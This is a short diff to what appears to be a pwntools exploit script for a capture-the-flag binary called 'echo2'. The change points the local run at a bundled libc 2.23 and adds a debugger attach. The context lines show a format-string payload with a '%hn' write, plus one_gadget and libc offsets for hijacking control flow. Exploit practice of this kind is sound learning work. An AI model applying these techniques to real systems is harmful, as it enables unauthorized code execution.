@@ -9,8 +9,9 @@ context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == 'l':
-    io = process("./echo2")
-    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    io = process("./echo2", env = {"LD_PRELOAD": "./libc-2.23.so.x86_64"})
+    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    libc = ELF("./libc-2.23.so.x86_64")
     elf = ELF("./echo2")
     one_gadget = 0x3f2d6
     libc_offset = 0x00000000000201c0
@@ -47,6 +48,7 @@ def fmt(target, bullet):
     sleep(0.5)
 
     payload = ("%" + str(bullet >> 32 & 0xffff) + "c%8$hn").ljust(16, ".") + p64(target + 4)
+    gdb.attach(io)
     io.sendline(payload)
     io.recv()
     sleep(0.5)
